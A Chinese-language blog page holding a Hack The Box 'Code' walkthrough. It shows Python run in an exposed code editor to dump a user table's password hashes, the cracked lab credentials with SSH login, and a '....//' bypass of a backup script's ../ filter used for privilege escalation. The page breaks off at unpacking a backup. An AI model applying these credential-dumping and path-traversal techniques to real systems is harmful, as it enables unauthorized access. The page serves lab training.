@@ -1,0 +1,766 @@
+
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="light">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>XSS-and-Security-Labs：Hackthebox 赛季靶场 Code Writeup：Python 代码编辑器漏洞利用到 Root 提权 - Rabbit's Blog</title>
+
+  
+    <meta name="description" content="介绍 靶机链接: https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Code 靶机 IP: 10.10.11.62  本次 Hackthebox 靶机 “Code” 的目标是利用一个运行在 5000 端口的 Python 代码编辑器，通过代码执行漏洞获取用户凭据，然后利用 backy.sh 备份脚本的漏洞进行提权，最终获取 root 权限。  思路：  信息收集：使用Nmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox 赛季靶场 Code Writeup：Python 代码编辑器漏洞利用到 Root 提权">
+<meta property="og:url" content="https://askrabbit.cn/2025/03/31/Code%20%E2%80%94%20Hack%20The%20Box/">
+<meta property="og:site_name" content="Rabbit&#39;s Blog">
+<meta property="og:description" content="介绍 靶机链接: https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Code 靶机 IP: 10.10.11.62  本次 Hackthebox 靶机 “Code” 的目标是利用一个运行在 5000 端口的 Python 代码编辑器，通过代码执行漏洞获取用户凭据，然后利用 backy.sh 备份脚本的漏洞进行提权，最终获取 root 权限。  思路：  信息收集：使用Nmap">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330162624200.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330162514860.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330164849861.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330165204575.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330170439668.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331144615445.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330170826720.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331145548101.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330172053945.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330172657882.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331124548226.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331125134164.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331125707805.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331141919626.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331142045180.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331142142058.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331141619024.png">
+<meta property="article:published_time" content="2025-03-31T12:46:25.000Z">
+<meta property="article:modified_time" content="2025-03-31T12:46:25.000Z">
+<meta property="article:author" content="Rabbit">
+<meta property="article:tag" content="Hack The Box">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330162624200.png">
+  
+  
+  
+  <meta name="keywords" content="编程, Web开发, 前端, 后端, JavaScript, Python, 个人成长, 生活, 思考, Rabbit, 安全, 读书, 微信读书, 女权">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+
+  
+    <link rel="shortcut icon" href="https://favorably-7690.oss-cn-beijing.aliyuncs.com/icon/%E5%85%94%E5%AD%90%20(2).png">
+  
+
+  
+
+  <link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css"
+  media="all"
+/>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body>
+
+
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/XSS-and-Security-Labs/logo-htb.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/XSS-and-Security-Labs/"><div class="main" ff="title">XSS-and-Security-Labs</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/XSS-and-Security-Labs/" placeholder="在文档中搜索..."></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item active" title="探索" href="/wiki/"><span>探索</span></a></nav>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">Start</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/#start"><span class="toc-text">Web 安全靶场与 XSS 挑战文档</span></a></div><div class="widget-header dis-select"><span class="name">Hack The Box</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/index%20-%202"><span class="toc-text">Hack The Box (HTB)</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Precious"><span class="toc-text">Precious — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/MonitorsTwo"><span class="toc-text">MonitorsTwo — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Inject"><span class="toc-text">Inject — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Busqueda"><span class="toc-text">Busqueda — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Code"><span class="toc-text">Hackthebox 赛季靶场 Code Writeup：Python 代码编辑器漏洞利用到 Root 提权</span></a></div><div class="widget-header dis-select"><span class="name">XSS Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Google%20XSS%20Game"><span class="toc-text">Google XSS Game</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/XSS%20Challenges"><span class="toc-text">XSS Challenges</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/xss-labs"><span class="toc-text">xss-labs</span></a></div><div class="widget-header dis-select"><span class="name">File upload Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Upload-labs"><span class="toc-text">Upload-labs 靶场</span></a></div><div class="widget-header dis-select"><span class="name">SQL injection</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs"><span class="toc-text">sqli-labs 靶场（手工注入）</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs-SQLMap"><span class="toc-text">sqli-labs 靶场使用 SQLMap 注入（1-25 关）</span></a></div><div class="widget-header dis-select"><span class="name">Comprehensive shooting range</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/DVWA-master"><span class="toc-text">DVWA 靶场</span></a></div><div class="widget-header dis-select"><span class="name">Reproducible vulnerability</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Reproducible%20vulnerability"><span class="toc-text">已知漏洞复现与验证</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/CyberPanel%20has%20a%20remote%20code%20execution%20(RCE)%20vulnerability"><span class="toc-text">【漏洞复现 - 241029】CyberPanel 存在远程代码执行（RCE）漏洞</span></a></div></widget>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" onclick="switchTheme()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" fill-rule="evenodd" d="M582.4 326.4c-140.8 0-256 115.2-256 256s115.2 256 256 256 256-115.2 256-256-115.2-256-256-256z m0 448c-70.4 0-131.2-36.8-164.8-92.8 12.8 3.2 27.2 4.8 40 4.8 121.6 0 219.2-99.2 219.2-219.2 0-17.6-1.6-35.2-6.4-52.8 60.8 32 102.4 96 102.4 169.6 1.6 104-84.8 190.4-190.4 190.4zM582.4 262.4c17.6 0 32-14.4 32-32v-128c0-17.6-14.4-32-32-32s-32 14.4-32 32v128c0 17.6 14.4 32 32 32zM262.4 582.4c0-17.6-14.4-32-32-32h-128c-17.6 0-32 14.4-32 32s14.4 32 32 32h128c17.6 0 32-14.4 32-32zM310.4 356.8c6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6 12.8-12.8 12.8-32 0-44.8l-91.2-91.2c-12.8-12.8-32-12.8-44.8 0-12.8 12.8-12.8 32 0 44.8l91.2 91.2zM944 220.8c-12.8-12.8-32-12.8-44.8 0l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-33.6 0-44.8zM310.4 808l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-32 0-44.8-11.2-11.2-32-11.2-44.8 0z"></path></svg></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/XSS-and-Security-Labs/">XSS-and-Security-Labs</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-03-31T12:46:25.000Z">2025-03-31</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Hackthebox 赛季靶场 Code Writeup：Python 代码编辑器漏洞利用到 Root 提权</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h2 id="介绍">介绍</h2>
+<p><strong>靶机链接:</strong> <a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Code">https://app.hackthebox.com/machines/Code</a><br>
+<strong>靶机 IP:</strong> 10.10.11.62</p>
+<blockquote>
+<p>本次 Hackthebox 靶机 “Code” 的目标是利用一个运行在 5000 端口的 Python 代码编辑器，通过代码执行漏洞获取用户凭据，然后利用 <code>backy.sh</code> 备份脚本的漏洞进行提权，最终获取 root 权限。</p>
+</blockquote>
+<p><strong>思路：</strong></p>
+<ol>
+<li><strong>信息收集</strong>：使用Nmap发现开放的5000端口运行Python代码执行服务</li>
+<li><strong>漏洞发现</strong>：利用SQLAlchemy ORM进行数据库查询获取用户凭据</li>
+<li><strong>获取立足点</strong>：使用破解的用户凭据进行SSH登录</li>
+<li><strong>权限提升</strong>：利用备份脚本<code>backy.sh</code>的路径解析漏洞访问受限目录</li>
+</ol>
+<h2 id="一、信息收集">一、信息收集</h2>
+<p>首先使用 Nmap 进行端口扫描</p>
+<p><strong>Nmap 扫描结果：</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330162624200.png" alt="image-20250330162624200"></p>
+<ol>
+<li>发现开放的22(SSH)和5000(HTTP)端口。5000端口运行着&quot;Python Code Execution Page&quot;。</li>
+<li><strong>确定Web框架</strong>
+<ul>
+<li>尝试Django ORM语法：<code>User.objects.all()</code>（失败）</li>
+<li>尝试SQLAlchemy语法：<code>User.query.all()</code>（成功）</li>
+<li>确认目标使用SQLAlchemy作为ORM框架</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">users = db.session.query(User).<span class="built_in">all</span>()</span><br><span class="line"><span class="built_in">print</span>([(u.<span class="built_in">id</span>, u.username, u.password) <span class="keyword">for</span> u <span class="keyword">in</span> users])</span><br></pre></td></tr></table></figure>
+<p><strong>代码执行结果：</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330162514860.png" alt="image-20250330162514860"></p>
+<p>成功查询到用户 <code>development</code> 和 <code>martin</code> 的信息，包括用户名和密码哈希值</p>
+<p>使用<a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation</a>在线破解获得明文密码</p>
+<p><strong>密码破解结果：</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330164849861.png" alt="image-20250330164849861"></p>
+<p>成功破解出两个用户的明文密码：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">用户 ID</th>
+<th style="text-align:left">用户名</th>
+<th style="text-align:left">密码哈希 (Password Hash)</th>
+<th style="text-align:left">哈希类型 (Hash Type)</th>
+<th style="text-align:left">已破解密码 (Cracked Password)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left">development</td>
+<td style="text-align:left"><code>759b74ce43947f5f4c91aeddc3e5bad3</code></td>
+<td style="text-align:left">md5</td>
+<td style="text-align:left"><code>development</code></td>
+</tr>
+<tr>
+<td style="text-align:left">2</td>
+<td style="text-align:left">martin</td>
+<td style="text-align:left"><code>3de6f30c4a09c27fc71932bfc68474be</code></td>
+<td style="text-align:left">md5</td>
+<td style="text-align:left"><code>nafeelswordsmaster</code></td>
+</tr>
+</tbody>
+</table>
+<p>尝试使用破解的密码进行 SSH 登录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh development@10.10.11.62  <span class="comment"># 失败</span></span><br><span class="line">ssh martin@10.10.11.62       <span class="comment"># 成功（密码：nafeelswordsmaster）</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330165204575.png" alt="image-20250330165204575"></p>
+<h2 id="二、userFlag">二、userFlag</h2>
+<p>登录 <code>martin</code> 用户后，首先查看用户目录下的文件，发现 <code>backups</code> 目录。</p>
+<p>进入 <code>backups</code> 目录，查看目录内容，没有发现 <code>user.txt</code> 文件。</p>
+<p>输入 <code>sudo -l</code> 命令查看当前用户可以以 sudo 权限执行的命令。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330170439668.png" alt="image-20250330170439668"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331144615445.png" alt="image-20250331144615445"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330170826720.png" alt="image-20250330170826720"></p>
+<p>发现 <code>martin</code> 用户可以使用 sudo 权限执行 <code>/usr/bin/backy.sh</code> 脚本，这可能是一个提权点。</p>
+<p>查看 <code>/usr/bin/backy.sh</code> 脚本的内容：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/bin/backy.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [[ $# -ne 1 ]]; then</span><br><span class="line">    /usr/bin/echo &quot;Usage: $0 &lt;task.json&gt;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">json_file=&quot;$1&quot;</span><br><span class="line"></span><br><span class="line">if [[ ! -f &quot;$json_file&quot; ]]; then</span><br><span class="line">    /usr/bin/echo &quot;Error: File &#x27;$json_file&#x27; not found.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">定义了允许备份的路径前缀，只允许备份以 /var/ 或 /home/ 开头的目录</span></span><br><span class="line">allowed_paths=(&quot;/var/&quot; &quot;/home/&quot;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 jq 工具处理JSON文件，删除 directories_to_archive 数组中所有路径中的 ../ 序列</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里在尝试防止目录遍历，但它只替换了确切的 ../ 字符串</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gsub(<span class="string">&quot;\\.\\./&quot;</span>; <span class="string">&quot;&quot;</span>): 这是 gsub 函数，用于全局替换字符串。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;\\.\\./&quot;</span>: 要被替换的 正则表达式。 \\. 表示转义后的点号 (.)， \. 表示字面意义的点号。 .. 就是字面意义的 <span class="string">&quot;..&quot;</span>。 所以</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">\\.\\./ 匹配的是字符串 ../。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;&quot;</span>: 替换成空字符串。</span></span><br><span class="line"></span><br><span class="line">updated_json=$(/usr/bin/jq &#x27;.directories_to_archive |= map(gsub(&quot;\\.\\./&quot;; &quot;&quot;))&#x27; &quot;$json_file&quot;)</span><br><span class="line"></span><br><span class="line">/usr/bin/echo &quot;$updated_json&quot; &gt; &quot;$json_file&quot;</span><br><span class="line"></span><br><span class="line">directories_to_archive=$(/usr/bin/echo &quot;$updated_json&quot; | /usr/bin/jq -r &#x27;.directories_to_archive[]&#x27;)</span><br><span class="line"></span><br><span class="line">is_allowed_path() &#123;</span><br><span class="line">    local path=&quot;$1&quot;</span><br><span class="line">    for allowed_path in &quot;$&#123;allowed_paths[@]&#125;&quot;; do</span><br><span class="line">        if [[ &quot;$path&quot; == $allowed_path* ]]; then</span><br><span class="line">            return 0</span><br><span class="line">        fi</span><br><span class="line">    done</span><br><span class="line">    return 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for dir in $directories_to_archive; do</span><br><span class="line">    if ! is_allowed_path &quot;$dir&quot;; then</span><br><span class="line">        /usr/bin/echo &quot;Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.&quot;</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">/usr/bin/backy &quot;$json_file&quot;</span><br><span class="line">martin@code:~$ </span><br></pre></td></tr></table></figure>
+<p>分析 <code>backy.sh</code> 脚本，发现其主要功能如下：</p>
+<ol>
+<li><strong>参数检查:</strong> 必须传入 JSON 配置文件路径（例如 <code>task.json</code>）。</li>
+<li><strong>路径过滤:</strong> 使用 <code>jq</code> 移除 <code>directories_to_archive</code> 中的 <code>../</code>，防止目录遍历攻击，可以使用 <code>....//</code> 这样的序列，当 <code>../</code> 被移除后，会变成 <code>../</code></li>
+<li><strong>路径限制:</strong>  只允许备份 <code>/var/</code> 和 <code>/home/</code> 开头的目录。</li>
+<li><strong>备份操作:</strong>  使用 <code>tar</code> 命令将指定目录打包备份到指定目标路径。</li>
+</ol>
+<p>进入 <code>backups</code> 目录，查看已存在的 <code>task.json</code> 文件内容。</p>
+<p><strong>查看 <code>task.json</code> 文件内容:</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250331145548101.png" alt="image-20250331145548101"></p>
+<p><code>task.json</code> 文件的内容配置了备份 <code>/home/app-production/app</code> 目录到 <code>/home/martin/backups/</code> 目录。</p>
+<p>尝试执行 <code>sudo /usr/bin/backy.sh task.json</code> 命令，测试备份脚本是否正常工作。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330172053945.png" alt="image-20250330172053945"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Code%20%E2%80%94%20Hack%20The%20Box/image-20250330172657882.png" alt="image-20250330172657882"></p>
+<p>脚本成功执行，并在 <code>/home/martin/backups/</code> 目录下生成了一个压缩包 <code>code_home_app-production_app_xxxx_xxxx.tar.bz2</code>。</p>
+<p>解压该压缩包，验证备份内容。</p>
+<p><strong>解压备份文件：</strong></p>
